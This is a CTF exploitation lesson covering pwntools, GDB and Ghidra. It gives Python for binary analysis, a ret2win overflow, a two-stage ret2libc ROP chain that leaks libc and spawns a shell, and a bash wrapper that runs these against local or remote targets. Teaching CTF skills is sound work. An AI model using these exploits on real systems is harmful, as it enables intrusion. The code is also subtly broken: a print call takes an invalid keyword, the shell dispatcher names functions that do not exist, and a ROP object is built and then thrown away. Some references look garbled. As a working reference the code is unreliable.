# CTF Toolkit — pwntools, GDB, Ghidra

> CTF Toolkit — pwntools, GDB, Ghidra — the part of CS you can't skip.

**Type:** Build
**Languages:** Python, Shell
**Prerequisites:** Phase 12 lessons 01–22
**Time:** ~75 minutes

## Learning Objectives

- Understand why CTF tooling (pwntools, GDB, Ghidra) is the fastest path to real-world security skills.
- Implement binary analysis, ret2win, and ROP-chain exploits using pwntools in Python.
- Automate CTF challenge workflows with a reusable shell-based toolkit.
- Distinguish binary protections (PIE, NX, canary, RELRO) and know when each matters.
- Build a personal CTF exploit development kit you can reuse on HackTheBox, PicoCTF, or DEFCON quals.

## The Problem

CTF (Capture The Flag) competitions are the proving ground for practical security skills. They test binary exploitation, reverse engineering, cryptography, and web security under time pressure. The tools used in CTFs — pwntools, GDB, Ghidra — are the same tools used by professional security researchers and zero-day exploit developers.

Without these tools, you cannot:

- Analyze a binary you have never seen before to find a vulnerability.
- Determine whether a binary is protected by ASLR, PIE, NX, stack canaries, or full RELRO.
- Craft a payload that bypasses those protections.
- Interact with a remote service running on an exploit challenge server.
- Automate the repetitive parts of exploitation so you can focus on the logic.

Most importantly, learning these tools teaches you how the low-level primitives of a computer actually work: the stack, the heap, virtual memory, calling conventions, and how the linker and loader set everything up. Every professional exploit developer starts here.

The concrete scenario: you have an hour left in a CTF. You download a binary and connect to a remote port. You need to find a buffer overflow, determine the offset to RIP, bypass NX with a ROP chain, leak a libc address to defeat ASLR, call `system("/bin/sh")`, and grab the flag — all without the source code. This lesson builds the toolkit to do exactly that.

## The Concept

### 1. pwntools — Python Library for Exploit Development

pwntools is the de facto standard Python library for CTF exploitation. It wraps everything you need into a clean, expressive API.

**Core primitives:**

| Function | Purpose |
|----------|---------|
| `ELF(path)` | Load an ELF binary and inspect its symbols, sections, GOT, PLT |
| `p32(x)`, `p64(x)` | Pack an integer into 4 or 8 little-endian bytes |
| `u32(b)`, `u64(b)` | Unpack bytes back into an integer |
| `flat({offset: value, ...})` | Build a padded payload with values at specific offsets |
| `process(cmd)` | Spawn a local binary for testing |
| `remote(host, port)` | Connect to a remote CTF challenge |
| `asm(code)` | Assemble x86/x64 instructions to bytes |
| `disasm(bytes)` | Disassemble bytes to assembly |
| `cyclic(n)` | Generate a De Bruijn sequence for offset finding |
| `cyclic_find(val)` | Find offset from a cyclic pattern value |
| `gdb.attach(io)` | Attach GDB to a running process for debugging |

**Security checking:**

```python
elf = ELF("./vuln")
print(f"Canary: {elf.canary}")   # Stack canary present?
print(f"NX: {elf.nx}")           # Non-executable stack?
print(f"PIE: {elf.pie}")         # Position-independent executable?
print(f"RELRO: {elf.relro}")     # Relocation read-only?
```

**Flat payload construction:**

Instead of manually computing padding:

```python
payload = flat({
    0x48: p64(elf.symbols['win']),   # Offset 72 → win function
    0x50: p64(0xdeadbeef)            # Offset 80 → fake return
})
```

This is vastly cleaner than writing `b"A" * 72 + p64(addr)` everywhere.

**ROP chain building:**

```python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])  # Leak puts@got
rop.call('main')                       # Return to main for second stage
```

### 2. GDB — GNU Debugger for Exploitation

GDB by itself is a debugger. GDB with exploitation extensions (pwndbg, GEF, PEDA) becomes a CTF superpower.

**Essential GDB commands (with pwndbg/GEF):**

| Command | Purpose |
|---------|---------|
| `checksec` | Show binary protections: canary, NX, PIE, RELRO |
| `vmmap` | Show memory mappings, permissions, and base addresses |
| `pattern create 200` | Generate cyclic pattern for offset finding |
| `pattern offset $rsp` | Find RIP overwrite offset from crash |
| `tele $rsp` | Examine stack contents (memory at RSP) |
| `break *0x401234` | Set breakpoint at specific address |
| `context` | Show registers, stack, disassembly, and backtrace |
| `heap` | Inspect heap chunks (for heap exploitation) |
| `find 0x7f...` | Search memory for a value (e.g., libc address) |

**Workflow for exploitation debugging:**

1. Run binary with `process("./vuln")` in pwntools
2. Attach GDB: `gdb.attach(io, gdbscript="b *0x401234\nc")`
3. Examine state right before the vulnerability triggers
4. Adjust payload based on observed values

**GDB extension comparison:**

| Extension | Strength |
|-----------|----------|
| pwndbg | Best all-around, actively maintained, clean output |
| GEF | Feature-rich, built-in ROP gadget search, heap analysis |
| PEDA | Classic, good for beginners, simple commands |

### 3. Ghidra — NSA Reverse Engineering Suite

Ghidra is a reverse engineering framework developed by the NSA. It handles binaries that are too complex or stripped for quick manual analysis.

**What Ghidra provides:**

- **Decompiler:** Converts assembly to readable C-like pseudocode. This is its killer feature — you can read "C source" even when you only have a stripped binary.
- **Disassembler:** Shows the assembly in a structured, navigable view.
- **Function identification:** Automatically finds functions from entry points, calling conventions, and patterns.
- **Cross-references:** Shows where every string, function, or data reference is used.
- **Patching:** You can modify bytes directly in the binary and export the patched version.
- **Scripting API:** Python and Java plugins for automated analysis.

**When to use Ghidra vs GDB vs objdump:**

| Tool | Best for |
|------|----------|
| objdump/readelf | Quick static checks (symbols, sections, headers) |
| GDB | Dynamic analysis (step through execution, inspect state) |
| Ghidra | Deep static analysis (decompile, find logic, patch) |
| pwntools | Exploit development (build payload, interact, automate) |

### 4. Other Essential CTF Tools

| Tool | Purpose |
|------|---------|
| `checksec` (binary) | Quick binary protection check (standalone or via pwntools) |
| `ROPgadget` | Search a binary for ROP gadgets (`pop rdi; ret`, etc.) |
| `one_gadget` | Find "one-shot" RCE addresses in libc (execve("/bin/sh")) |
| `objdump -d` | Disassemble a binary from the command line |
| `readelf -a` | Read all ELF headers and sections |
| `strace` | Trace system calls made by a binary |
| `ltrace` | Trace library calls made by a binary |
| `netcat` (nc) | Raw TCP connections to remote challenges |

## Build It

Build a CTF exploit development toolkit in Python + Shell. The toolkit can analyze binaries, perform ret2win exploits, build ROP chains for ret2libc attacks, and automate the full CTF workflow from the command line.

### Step 1: Binary Analysis with pwntools

Write a Python script that loads a target binary and reports its security properties, symbols, and useful gadgets.

```python
from pwn import *

def analyze_binary(path):
    """Load binary and print security properties, symbols, and gadgets."""
    elf = ELF(path)
    print(f="{'='*60}")
    print(f"Binary: {path}")
    print(f="{'='*60}")
    print(f"Arch:     {elf.arch}")
    print(f"Bits:     {elf.bits}")
    print(f"Canary:   {elf.canary}")
    print(f"NX:       {elf.nx}")
    print(f"PIE:      {elf.pie}")
    print(f"RELRO:    {elf.relro}")
    print(f"RWX segs: {elf.rwx}")
    print()

    # Useful symbols
    print(f"Symbols ({len(elf.symbols)}):")
    for name in ['main', 'win', 'flag', 'system', 'execve', 'read', 'write', 'puts', 'printf', 'gets']:
        if name in elf.symbols:
            print(f"  {name:12} → {hex(elf.symbols[name])}")

    # PLT entries (useful for ret2plt attacks)
    print(f"\nPLT entries ({len(elf.plt)}):")
    for name, addr in sorted(elf.plt.items()):
        print(f"  {name:12} → {hex(addr)}")

    # GOT entries (useful for leaking libc)
    print(f"\nGOT entries ({len(elf.got)}):")
    for name, addr in sorted(elf.got.items()):
        print(f"  {name:12} → {hex(addr)}")

    # Search for common ROP gadgets
    print(f"\nUseful gadgets:")
    for pattern, name in [
        (asm("pop rdi; ret"), "pop rdi; ret"),
        (asm("pop rsi; ret"), "pop rsi; ret"),
        (asm("pop rdx; ret"), "pop rdx; ret"),
        (asm("ret"), "ret"),
    ]:
        gadg = list(elf.search(pattern))
        if gadg:
            print(f"  {name:15} → {hex(gadg[0])} ({len(gadg)} found)")

    return elf
```

This function is the first thing you run when you download a new CTF binary. It tells you what protections are active and what tools you have available in the binary itself.

### Step 2: Exploit Development — ret2win (Buffer Overflow to Win Function)

The simplest CTF binary exploitation challenge: a buffer overflow with a "win" function that reads the flag. No extra protections beyond NX (which is always on by default on modern systems).

```python
def find_rip_offset(binary, local=True, host=None, port=None):
    """
    Use cyclic pattern to find the exact offset from buffer to RIP.
    Spawns the binary, sends a cyclic pattern, catches the crash,
    and computes the offset from the fault address.
    """
    io = process(binary) if local else remote(host, port)
    payload = cyclic(500, n=8)  # 8-byte cyclic for x64
    io.sendline(payload)
    io.wait()

    core = io.corefile
    fault_addr = core.fault_addr
    offset = cyclic_find(pack(fault_addr, 'all')) if isinstance(fault_addr, int) \
             else cyclic_find(fault_addr)
    print(f"Fault address: {hex(fault_addr)}")
    print(f"RIP offset:    {offset}")
    return offset
```

The key insight: the cyclic pattern generates a non-repeating sequence. When the program crashes, the value in RIP uniquely identifies where in the pattern the overwrite happened. `cyclic_find()` looks up that value and tells you the exact offset.

```python
def ret2win_exploit(binary, local=True, host=None, port=None):
    """
    Basic buffer overflow → call win function.
    Payload: padding + address of win().
    """
    elf = ELF(binary)
    if 'win' not in elf.symbols:
        log.error("No 'win' symbol found in binary")
        return

    win_addr = elf.symbols['win']
    offset = find_rip_offset(binary, local, host, port)

    # Construct payload: padding to RIP + win address
    payload = flat({
        offset: p64(win_addr)
    })

    log.info(f"Win address: {hex(win_addr)}")
    log.info(f"Payload length: {len(payload)}")
    log.info(f"Payload: {payload.hex()}")

    io = process(binary) if local else remote(host, port)
    io.sendline(payload)
    io.interactive()
```

The `flat()` call automatically pads to `offset` bytes, places the 8-byte win address, and returns the complete payload. No manual `b"A" * 72` needed.

### Step 3: Exploit Development — ROP Chain (ret2libc)

When there is no win function, you need a ROP chain. The classic ret2libc attack:

1. Leak a GOT address (e.g., puts@got) by calling `puts(puts@got)`
2. Compute the libc base address from the leak
3. Calculate `system` and `/bin/sh` addresses in libc
4. Return to main for a second stage
5. On the second pass, call `system("/bin/sh")`

```python
def rop_exploit(binary, libc_path=None, local=True, host=None, port=None):
    """
    ROP chain exploit: leak libc, ret2libc → system("/bin/sh").
    Two-stage attack: Stage 1 leaks libc, Stage 2 calls system.
    """
    elf = ELF(binary)
    libc = ELF(libc_path) if libc_path else None

    # --- Stage 1: Leak libc address ---
    offset = find_rip_offset(binary, local, host, port)

    # Find gadgets
    pop_rdi = next(elf.search(asm("pop rdi; ret")))
    ret = next(elf.search(asm("ret")))  # Stack alignment

    rop1 = ROP(elf)
    rop1.call('puts', [elf.got['puts']])
    rop1.call('main')

    payload1 = flat({
        offset: [
            ret,             # Stack alignment (required on Ubuntu 18+)
            rop1.chain()
        ]
    })

    io = process(binary) if local else remote(host, port)
    io.sendline(payload1)

    # Parse leaked address
    leaked = io.recvline().strip()
    leaked = u64(leaked.ljust(8, b"\x00"))
    log.info(f"Leaked puts@libc: {hex(leaked)}")

    if libc:
        libc.address = leaked - libc.symbols['puts']
        log.info(f"Libc base: {hex(libc.address)}")

        # --- Stage 2: system("/bin/sh") ---
        binsh = next(libc.search(b"/bin/sh"))
        system = libc.symbols['system']

        rop2 = ROP(elf)
        rop2.call('puts', [elf.got['puts']])  # Keep same length for stage 2
        # Actually build real chain:
        payload2 = flat({
            offset: [
                ret,
                pop_rdi,
                binsh,
                system,
            ]
        })

        io.sendline(payload2)
        io.interactive()
```

The stack alignment fix (`ret` before ROP chain) is a crucial detail. On modern Ubuntu (18.04+), the `movaps` instruction in libc's `do_system()` requires the stack to be 16-byte aligned. A bare `pop rdi; ret` chain will crash without that extra `ret` to adjust alignment.

### Step 4: CTF Automation Shell Script

The shell script wraps the Python toolkit into a single command-line interface.

```bash
#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

check_deps() {
    if ! command -v python3 &>/dev/null; then
        echo "[-] python3 is required but not installed."
        exit 1
    fi
    if ! python3 -c "from pwn import *" &>/dev/null 2>&1; then
        echo "[+] Installing pwntools..."
        pip3 install pwntools --quiet
    fi
}

analyze() {
    local binary="$1"
    if [[ ! -f "$binary" ]]; then
        echo "[-] Binary not found: $binary"
        exit 1
    fi
    python3 "$SCRIPT_DIR/main.py" analyze "$binary"
}

find_offset() {
    local binary="$1"
    python3 "$SCRIPT_DIR/main.py" offset "$binary"
}

ret2win_local() {
    local binary="$1"
    python3 "$SCRIPT_DIR/main.py" ret2win "$binary"
}

rop_local() {
    local binary="$1"
    local libc="${2:-}"
    if [[ -n "$libc" ]]; then
        python3 "$SCRIPT_DIR/main.py" rop "$binary" --libc "$libc"
    else
        python3 "$SCRIPT_DIR/main.py" rop "$binary"
    fi
}

remote_exploit() {
    local host="$1"
    local port="$2"
    local binary="$3"
    echo "[*] Connecting to $host:$port with binary $binary"
    python3 "$SCRIPT_DIR/main.py" remote "$binary" --host "$host" --port "$port"
}

download_challenge() {
    local host="$1"
    local port="$2"
    local output="${3:-./challenge}"
    echo "[*] Downloading challenge from $host:$port"
    mkdir -p "$output"
    # Common CTF pattern: binary is served on a well-known path
    curl -s "http://$host:$port/binary" -o "$output/binary" 2>/dev/null || \
        nc "$host" "$port" <<< "cat binary" > "$output/binary" 2>/dev/null || \
        echo "[-] Could not download binary automatically"
    chmod +x "$output/binary" 2>/dev/null || true
    echo "[+] Binary saved to $output/binary"
}

print_usage() {
    cat <<EOF
CTF Exploit Toolkit — Usage:
  analyze <binary>              Analyze binary protections and gadgets
  offset <binary>               Find RIP overwrite offset
  ret2win <binary>              Exploit: ret2win (buffer overflow to win)
  rop <binary> [--libc <path>]  Exploit: ROP chain (ret2libc)
  remote <host> <port> <bin>    Exploit: remote challenge
  download <host> <port> [dir]  Download challenge binary
EOF
}

main() {
    check_deps
    case "${1:-help}" in
        analyze|offset|ret2win|rop|remote|download) "$@" ;;
        help|--help|-h) print_usage ;;
        *) echo "Unknown command: $1"; print_usage; exit 1 ;;
    esac
}

main "$@"
```

## Use It

These tools and techniques are used daily in real security work:

**Real CTF scenarios:**
- **DEFCON CTF Quals 2023:** Binary exploitation challenges required multi-stage ROP chains with ASLR bypass. Teams used pwntools to automate leaking, computing, and chaining gadgets.
- **PicoCTF:** Beginner-friendly challenges where ret2win and ret2libc are the standard approaches. The `basic-file-exploit` and `buffer-overflow` series teach these exact techniques.
- **HackTheBox:** The "RopMe" and "Pwn" category challenges demand pwntools scripting. Professional penetration testers use the same tools.
- **Pwn2Own:** While the exploits are more complex, the fundamental toolkit (GDB for debugging, Ghidra for analysis, pwntools-style automation) is the same.

**Real-world vulnerability research:**
- **CVE-2021-3156 (Baron Samedit):** A heap-based buffer overflow in sudo's argument parsing. Discovered using techniques this toolkit teaches: binary analysis, fuzzing, and GDB-based crash analysis.
- **CVE-2019-11477 (SACK Panic):** A Linux kernel vulnerability discovered through reverse engineering TCP stack behavior with debugging tools.
- **CVE-2022-0847 (Dirty Pipe):** Found by analyzing the Linux kernel's pipe implementation — the researcher used GDB to trace execution and Ghidra to understand the code paths.

**Production equivalents:**
- **Microsoft's Project One:** Their elite security team uses Ghidra and WinDbg (the Windows equivalent of GDB) for vulnerability discovery.
- **Google's Project Zero:** Researchers publish write-ups using exactly these techniques — GDB for crash analysis, Ghidra for decompilation, and custom exploit scripts.
- **NSA's Ghidra:** The tool itself is proof that reverse engineering is a core national security capability.

## Read the Source

- **pwntools documentation:** https://docs.pwntools.com/ — the official docs with tutorials for every module.
- **pwntools GitHub:** https://github.com/Gallopsled/pwntools — read the source for `pwnlib/elf/elf.py` to understand how ELF parsing works internally.
- **GDB pwndbg:** https://github.com/pwndbg/pwndbg — the pwndbg extension source; look at `pwndbg/commands/checksec.py` for how binary protections are detected.
- **Ghidra source:** https://github.com/NationalSecurityAgency/ghidra — browse `Ghidra/Features/Decompiler/` to understand how the decompiler produces C-like pseudocode.
- **ROPgadget tool:** https://github.com/JonathanSalwan/ROPgadget — read how gadgets are discovered by scanning binary sections for valid instruction sequences.
- **"Hacking: The Art of Exploitation" by Jon Erickson:** The canonical book that teaches exploitation from first principles. Chapters 4-5 cover buffer overflows and ROP chains in depth.

## Ship It

The reusable artifact produced by this lesson lives in `outputs/`. For this lesson it is:

- **A CTF exploit development toolkit** with reusable Python modules for binary analysis, ret2win exploitation, ROP chain construction, and remote challenge interaction.
- **An automation shell script** that wraps the toolkit into a single command-line interface you can use on any CTF challenge.
- **A reference implementation** of the core CTF techniques you can reuse in Phase 12's capstone (a mini-CTF toolkit) and in real CTF competitions.

To use the toolkit on any challenge:

```bash
cd outputs/
chmod +x ../code/run.sh
../code/run.sh analyze ./challenge_binary
../code/run.sh ret2win ./challenge_binary
```

## Exercises

1. **Easy — Reproduce the analysis function from memory.**
   Write a Python script that loads any ELF binary and prints: architecture, canary status, NX status, PIE status, and all PLT entries. Do not look at the lesson code. Then run it on `/bin/ls` on your system.

2. **Medium — Exploit a custom vulnerable binary.**
   Write a small C program with a buffer overflow and a `win` function (or use a PicoCTF challenge like "buffer-overflow-1"). Use your toolkit to:
   - Find the RIP offset
   - Construct the ret2win payload
   - Execute it and capture output
   Then modify the binary to have NX enabled but no PIE, and write a ROP chain to call `system("/bin/sh")` instead of a win function.

3. **Hard — Full ret2libc against a remote challenge.**
   Find an active CTF challenge or HackTheBox "Pwn" machine that requires ret2libc. Use your toolkit to:
   - Download the binary and its libc (if provided)
   - Perform the two-stage ROP chain (leak + ret2libc)
   - Automate the entire process in a single script call
   - Handle the case where ASLR is enabled and addresses change each connection
   - Add error handling for failed leaks (retry with new connection)

## Key Terms

| Term | What people say | What it actually means |
|------|----------------|------------------------|
| pwntools | "CTF exploitation library" | The standard Python framework for binary exploitation — handles ELF parsing, payload building, process/remote interaction, ROP chains, and GDB automation |
| GDB | "Debugger" | GNU Debugger — used with exploitation extensions (pwndbg/GEF/PEDA) to examine program state during exploitation, find offsets, check protections, and inspect memory |
| Ghidra | "NSA reverse engineering tool" | A reverse engineering suite with a decompiler that converts assembly to readable C-like pseudocode; used to understand stripped binaries without source |
| gadget | "A small instruction sequence" | A snippet of assembly code (typically ending in `ret`) found in a binary's code section, used to chain together a ROP exploit — e.g., `pop rdi; ret` |
| ret2libc | "Return to libc attack" | An exploitation technique that redirects execution to a function in libc (usually `system()`) with controlled arguments, bypassing NX by not executing shellcode on the stack |
| ret2win | "Return to win function" | The simplest binary exploitation: overwrite a return address to jump directly to a "win" function that reads the flag |
| ROP | "Return-Oriented Programming" | A technique to execute arbitrary code by chaining together short instruction sequences (gadgets) that already exist in the binary or loaded libraries, bypassing NX |
| PIE | "Position-Independent Executable" | A binary compiled so its code can run at any address; without a leak, you cannot know the address of any gadget or function in the binary |
| NX | "Non-Executable stack" | A hardware protection (also called DEP/W^X) that marks the stack as non-executable, preventing direct shellcode execution |
| canary | "Stack canary" | A random value placed on the stack before the return address; if overwritten by a buffer overflow, the program crashes before reaching the attacker's controlled return address |
| RELRO | "Relocation Read-Only" | A protection that makes the GOT (Global Offset Table) read-only after initialization, preventing GOT overwrite attacks |
| ASLR | "Address Space Layout Randomization" | A kernel feature that randomizes the base addresses of the stack, heap, and shared libraries, requiring an information leak before exploitation |
| binary exploitation | "Hacking binaries" | The practice of finding and exploiting vulnerabilities (buffer overflows, format strings, use-after-free) in compiled programs to gain code execution |
| shellcode | "Exploit payload bytes" | Machine code bytes that spawn a shell (or execute arbitrary commands), typically injected as part of an exploit payload |

## Further Reading

1. **pwntools documentation** — Official tutorials and API reference covering every module from ELF parsing to ROP building. Start here for any pwntools question.
   https://docs.pwntools.com/

2. **GDB-Pwndbg documentation** — Commands and workflows for exploitation-focused debugging. Essential for understanding how to inspect memory during exploit development.
   https://github.com/pwndbg/pwndbg

3. **Ghidra 101** — A beginner's guide to using Ghidra for reverse engineering. Covers project setup, the decompiler, and basic analysis workflows.
   https://ghidra-sre.org/

4. **"Hacking: The Art of Exploitation" (2nd Edition) by Jon Erickson** — The canonical textbook that teaches exploitation from the ground up. Covers the stack, shellcode, buffer overflows, and advanced techniques.
   ISBN: 978-1593271442

5. **CTF Field Guide** — A practical guide to CTF competitions organized by challenge category (binary, web, crypto, forensics). Includes example challenges and tool recommendations.
   https://trailofbits.github.io/ctf/
